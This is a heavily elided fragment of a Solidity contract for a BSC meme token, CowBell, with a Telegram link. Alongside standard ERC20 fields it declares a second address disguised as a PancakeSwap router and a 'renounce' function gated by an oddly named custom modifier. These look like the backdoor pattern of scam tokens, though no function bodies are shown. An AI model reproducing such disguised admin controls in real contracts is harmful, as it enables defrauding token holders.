...
📱 Telegram : https://t.me/cowbellbsc
...
contract Context {
 ...
 contract COWBELL is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "CowBell";
    string private _symbol = "COWBELL";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancakeswap Router
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee = 5; // ADDED TO THE LP
    uint256 private multi = 1; // MARKETING
    ...
    address private _pancakeRouterTVENVOO = 0xAed6bc068cC4bE2ec8FC8Ba05F9008534035d162;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function renounce() public externelTVENVOO { // Delete Ownership
